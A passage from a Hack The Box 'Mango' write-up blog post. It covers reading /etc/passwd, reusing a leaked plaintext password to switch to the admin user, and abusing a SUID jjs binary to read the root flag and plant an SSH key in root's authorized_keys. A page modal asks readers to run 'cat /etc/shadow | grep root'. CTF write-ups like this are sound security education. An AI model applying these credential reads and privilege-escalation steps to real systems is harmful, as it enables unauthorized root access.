<span class="gp">mango@mango:~$</span><span class="w"> </span><span class="nb">cat</span> ../admin/user.txt
<span class="go">cat: ../admin/user.txt: Permission denied
</span><span class="gp">mango@mango:~$</span><span class="w">
</span></pre></table></code></div></div><p>mango user can’t read user flag. And admin user actually exists in the machine. Lets verify it.</p><h3 id="enum-user">Enum user</h3><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="gp">mango@mango:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
<span class="go">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mango:x:1000:1000:mango:/home/mango:/bin/bash
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
</span><span class="gp">mango@mango:~$</span><span class="w"> 
</span></pre></table></code></div></div><p>Yeah, admin user is a valid user in this machine. I still have the cred for admin. I just try with switch user command. <code class="highlighter-rouge">su admin</code> with password <code class="highlighter-rouge">t9KcS3&gt;!0B#2</code></p><h3 id="admin-shell">Admin shell</h3><p><img src="/img/mango/2020-04-18-10-05-00.png" alt="" /></p><p>Let just grab the user flag</p><p><img src="/img/mango/2020-04-18-10-06-36.png" alt="" /></p><h2 id="privesc">Privesc</h2><h3 id="lsesh">lse.sh</h3><p>Going through the enum script output, spent some time to spot this binary, it shows suid file for jjs in <code class="highlighter-rouge">/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code></p><p><img src="/img/mango/2020-04-18-07-25-14.png" alt="" /></p><h3 id="jjs-symlink">jjs Symlink</h3><p>I’m lazy person, so i just try to check if i can execute it without absolute path.</p><p><img src="/img/mango/2020-04-18-09-10-15.png" alt="" /></p><p>Yeah, it will save me some time.</p><h3 id="jjs-root-flag">jjs Root flag</h3><p>After reading basic info for jjs, I will try to read root flag to see if im able to do it with suid permission.</p><p><img src="/img/mango/2020-04-18-06-52-10.png" alt="" /></p><p>Oh well, I can. Nice!!. Maybe try to get reverse shell for leveraging my access.</p><h3 id="bash">bash</h3><p>Just spawn bash for interactive</p><p><img src="/img/mango/2020-04-18-09-09-05.png" alt="" /></p><p>After trying lot of payloads for reverse shell, all failed. Even with bind shell payload, i just get shell with same user = admin.</p><p>I’ll go to last option, ssh to root with my key. Just create priv key and using jjs to write it to authorized_keys. Using command from GTFO bins to write it.</p><h3 id="gtfo-bin">GTFO bin</h3><p><img src="/img/mango/2020-04-18-09-11-56.png" alt="" /></p><h3 id="authorized_keys">Authorized_keys</h3><p><img src="/img/mango/2020-04-18-09-01-38.png" alt="" /></p><h3 id="ssh-root">SSH Root</h3><p><img src="/img/mango/2020-04-18-09-02-08.png" alt="" /></p><p>Yeah, Got full power now. Nice!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/machine/'>machine</a>, <a href='/categories/writeup/'>writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box Write Up - Mango - zRyuki&url=https://zeroryuki.github.io/posts/mango/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box Write Up - Mango - zRyuki&u=https://zeroryuki.github.io/posts/mango/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box Write Up - Mango - zRyuki&url=https://zeroryuki.github.io/posts/mango/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/zeroryuki/ © 2020 zRyuki MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Traverxec/" class="btn btn-outline-primary"><p>Hack The Box Write Up - Traverxec</p></a> <a href="/posts/servmon/" class="btn btn-outline-primary"><p>Hack The Box Write Up - ServMon</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT License --><div id="disqus_thread" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> /* * * CONFIGURATION VARIABLES * * */ var disqus_shortname = "zryuki-space"; var disqus_identifier = "/posts/mango"; var disqus_url = "https://zeroryuki.github.io/posts/mango/"; if (document.getElementById('disqus_thread')) { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); } </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/zeroryuki/ © 2019 zRyuki Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Registry/"><div class="card-body"> <span class="timeago small"> Apr 5, 2020 <i class="unloaded">2020-04-05T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Registry</h3><div class="text-muted small"><p>Information Gathering Nmap We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ...</p></div></div></a></div><div class="card"> <a href="/posts/Traverxec/"><div class="card-body"> <span class="timeago small"> Apr 9, 2020 <i class="unloaded">2020-04-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - Traverxec</h3><div class="text-muted small"><p>Information Gathering As usual, i start my recon with nmap. Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # Nmap 7.80SVN scan initiated Thu Dec 5 21:18:15 2019 as: nm...</p></div></div></a></div><div class="card"> <a href="/posts/servmon/"><div class="card-body"> <span class="timeago small"> Apr 19, 2020 <i class="unloaded">2020-04-19T22:26:59+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Write Up - ServMon</h3><div class="text-muted small"><p>Info Gathering Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 6...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">zRyuki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/zeroryuki/ © 2019 zRyuki MIT Licensed --> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/zeroryuki/ © 2017-2019 zRyuki MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zeroryuki.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script><div class="modal fade" id="howModal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;"><div class="modal-dialog"><div class="modal-content"><div class="modal-header text-center"><div class="row"><div class="col-lg-12"> <img src="/img/mango/icon.png" style="height: 40px"><h4 data-toc-skip class="modal-title">MANGO</h4><small>This is an active Linux machine. You will need root's shadow hash to read the content</small><br></div></div></div><div class="modal-body"><div class="row"><div class="col-lg-12"><h4 data-toc-skip>How to unlock</h4><span class="subscriptionInfo"><p><i class="fas fa-hashtag"></i> Get machine's root Shadow<br> <code class="highlighter-rouge"><small>cat /etc/shadow | grep root</small></code></p><p><i class="fas fa-hashtag"></i> Hash<br> <code class="highlighter-rouge"><small>echo "{shadow value}" | md5sum</small></code></p><p><i class="fas fa-sign-in-alt"></i> Add hash below</p></span><div class="row"><div class="col-lg-8"> <input type="text" placeholder="Insert hash here.." value="" name="key" id="key" class="form-control"></div><div class="col-lg-4"> <span role="button" tabindex="0"> <button id="decrypt" tabindex="-1" type="submit" class="decrypt-btn" style="background-color: rgb(154, 204, 20); border-color: rgb(154, 204, 20); color: white;"> Decrypt </button> </span></div></div></div><div class="col-lg-12 text-center m-t-md" id="recurlyBalanceControlPanel"> You have <span class="text-warning">-</span> remaining attempt</div></div></div><div class="modal-footer"> <button type="button" class="btn btn-default" data-dismiss="modal"><i class="far fa-times"></i></button></div></div></div></div>
